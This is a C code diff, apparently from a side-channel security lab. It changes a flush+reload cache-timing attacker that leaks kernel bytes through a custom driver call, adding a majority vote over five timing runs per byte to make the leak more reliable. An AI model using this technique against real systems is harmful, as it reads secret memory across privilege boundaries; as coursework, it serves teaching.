@@ -15,6 +15,25 @@
 //Helper functions and misc variables
 uint64_t latency = 0;
 uint64_t threshold = 175;
+
+char majority(char* array, size_t size) {
+	size_t max_count = 0;
+	char majority_element = {0};
+	for(size_t i=0; i<size; i++) {
+		size_t count = 0;
+		for(size_t j=0; j<size; j++) {
+			if(array[j] == array[i]) {
+				count++;
+			}	
+		}
+		if(count > max_count) {
+			max_count = count;
+			majority_element = array[i];
+		}
+	}
+return majority_element;
+}
+
 /*
  * call_kernel_part1
  * Performs the COMMAND_PART1 call in the kernel
@@ -55,6 +74,10 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
 	
+	size_t iter = 5;
+	char leaked_byte_each_iter[iter];
+	for(size_t k=0; k<iter; k++) {
+
 	//Flush the shared memory	
 	for(size_t i=0; i<255; i++) {
 		clflush(shared_memory+i*4096);
@@ -74,7 +97,11 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 			break;
 		}	
 	}
-	leaked_byte = j;	
+
+	leaked_byte_each_iter[k] = j;
+	}
+
+	leaked_byte = majority(leaked_byte_each_iter, iter);	
 	//printf("j = %d\n", j);
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
